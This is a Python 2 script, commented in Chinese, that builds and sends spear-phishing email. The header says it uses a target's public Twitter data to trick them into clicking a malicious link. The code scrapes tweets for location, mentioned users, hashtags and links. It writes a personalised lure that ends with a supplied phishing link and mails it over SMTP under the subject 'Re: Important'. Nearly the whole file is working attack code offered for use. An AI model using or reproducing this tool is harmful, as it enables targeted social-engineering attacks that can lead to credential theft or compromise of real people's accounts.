#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/22
# Created by 冰河
# Description 利用目标对象留在Twitter中可以公开的访问的信息对他发送邮件进行钓鱼攻击
#             在Twitter上可以找到目标对象的地理位置信息、@过的用户、hash标签以及链接，
#             脚本会成成和发送一个带有恶意链接的电子邮件，等待目标对象去点击
#             用法： python smtp_twitter_send_mail.py -u <twitter target> -t <target email> -l <email login> -p <email password> -c <city file> -a <smtp address> -P <smtp port> -L <fish link>
# 博客 https://blog.csdn.net/l1028386804

import smtplib
import optparse
from email.mime.text import MIMEText
from mechainze_twitter_hobby import *
from random import choice

#发送电子邮件
def send_mail(user, pwd, to, subject, text, smtp_address, smtp_port):
    msg = MIMEText(text)
    msg['From'] = user
    msg['To'] = to
    msg['Subject'] = subject
    try:
        smtpServer = smtplib.SMTP(smtp_address, smtp_port)
        print '[+] Connecting To Mail Server.'
        smtpServer.ehlo()
        print '[+] Starting Encrypted Session.'
        smtpServer.starttls()
        smtpServer.ehlo()
        print '[+] Logging Into Mail Server.'
        smtpServer.login(user, pwd)
        print '[+] Sending Mail.'
        smtpServer.sendmail(user, to, msg.as_string())
        smtpServer.close()
        print '[+] Mail Sent Successfully.'
    except:
        print '[-] Sending Mail Failed.'

def main():
    parser = optparse.OptionParser('usage%prog -u <twitter target> -t <target email> -l <email login> -p <email password> -c <city file> -a <smtp address> -P <smtp port> -L <fish link>')
    parser.add_option('-u', dest='handle', type='string', help='specify twitter handle')
    parser.add_option('-t', dest='tgt', type='string', help='specify target email')
    parser.add_option('-l', dest='user', type='string', help='specify email login')
    parser.add_option('-p', dest='pwd', type='string', help='specify email password')
    parser.add_option('-a', dest='smtp_address', type='string', help='specify stmp server address')
    parser.add_option('-P', dest='smtp_port', type='int', help='specify stmp server port')
    parser.add_option('-c', dest='cityFile', type='string', help='specify city file')
    parser.add_option('-L', dest='fishLink', type='string', help='specify fish link')
    (options, args) = parser.parse_args()
    handle = options.handle
    tgt = options.tgt
    user = options.user
    pwd = options.pwd
    smtp_address = options.smtp_address
    smtp_port = options.smtp_port
    cityFile = options.cityFile
    fishLink = options.fishLink


    if handle == None or tgt == None or user == None or pwd == None or smtp_address == None or smtp_port == None or cityFile == None:
        print parser.usage
        exit(0)

    print '[+] Fetching tweets from: ' + str(handle)
    spamTgt = ReconPerson(handle)
    tweets = spamTgt.get_tweets()
    print '[+] Fetching interests from: ' + str(handle)
    interests = spamTgt.find_interests(tweets)
    print '[+] Fetching location information from: ' + str(handle)
    location = spamTgt.twitter_locate(tweets, cityFile)
    spamMsg = "Dear " + tgt + ","
    if (location != None):
        randLoc = choice(location)
        spamMsg += " Its me from " + randLoc + "."

    if (interests['users'] != None):
        randUser = choice(interests['users'])
        spamMsg += " " + randUser + " said to say hello."

    if (interests['hashtags'] != None):
        randHash = choice(interests['hashtags'])
        spamMsg += " Did you see all the fuss about " + randHash + "?"

    if (interests['links'] != None):
        randLink = choice(interests['links'])
        spamMsg += " I really liked your link to: " + randLink + "."

    spamMsg += " Check out my link to " + fishLink
    print "[+] Sending Msg: " + spamMsg

    send_mail(user, pwd, tgt, "Re: Important", spamMsg, smtp_address, smtp_port)

if __name__ == '__main__':
    main()